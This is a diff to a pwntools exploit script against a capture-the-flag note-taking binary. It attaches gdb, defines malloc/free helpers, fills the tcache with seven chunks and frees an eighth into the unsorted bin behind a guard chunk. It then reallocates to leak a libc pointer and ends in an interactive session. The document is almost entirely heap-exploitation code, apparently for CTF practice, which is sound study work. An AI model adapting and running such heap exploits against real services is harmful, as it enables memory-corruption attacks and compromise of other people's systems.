@@ -8,12 +8,12 @@ bin = ELF("./chall/app")
 
 p = process("./chall/app")
 pid = gdb.attach(p, gdbscript="""
-b * eton + 895
+b * eton + 950
 """)
 #p = remote("localhost", 1337)
 
-def malloc(p, idx, data):
-    p.sendline(b"note add " + idx + data)
+def malloc(p, idx, size, data):
+    p.sendline(b"note add " + idx + b" " + size + b" " + data)
 
 def free(p, idx):
     p.sendline(b"note remove " + idx)
@@ -25,15 +25,18 @@ p.sendline(payload_1)
 
 # heap stuff
 # tcachebins
-malloc(p, b"0", b" " + 130 * b"A")
-malloc(p, b"1", b" " + 130 * b"A")
-malloc(p, b"2", b" " + 130 * b"A")
-malloc(p, b"3", b" " + 130 * b"A")
-malloc(p, b"4", b" " + 130 * b"A")
-malloc(p, b"5", b" " + 130 * b"A")
-malloc(p, b"6", b" " + 130 * b"A")
+malloc(p, b"0", b"500", b"A")
+malloc(p, b"1", b"500", b"A")
+malloc(p, b"2", b"500", b"A")
+malloc(p, b"3", b"500", b"A")
+malloc(p, b"4", b"500", b"A")
+malloc(p, b"5", b"500", b"A")
+malloc(p, b"6", b"500", b"A")
 
-malloc(p, b"7", b" " + 130 * b"B")
+# will go to unsorted bins
+malloc(p, b"7", b"500", b"B")
+# anti-consolidation prot
+malloc(p, b"8", b"10", b"C")
 
 free(p, b"0")
 free(p, b"1")
@@ -43,13 +46,20 @@ free(p, b"4")
 free(p, b"5")
 free(p, b"6")
 
-free(p, b"7")  # goes to unsorted
+# goes to unsorted
+free(p, b"7")
 
-malloc(p, b"0", b"\x00")
+# malloc back from tcache
+malloc(p, b"0", b"500", b"D")
+malloc(p, b"1", b"500", b"D") 
+malloc(p, b"2", b"500", b"D") 
+malloc(p, b"3", b"500", b"D") 
+malloc(p, b"4", b"500", b"D")
+malloc(p, b"5", b"500", b"D") 
+malloc(p, b"6", b"500", b"D") 
 
+# malloc back from unsorted, but it overwrites leak
+malloc(p, b"7", b"500", 8 * b"A") 
 
-#malloc(p)
-#malloc(p)
-#malloc(p)
 
 p.interactive()
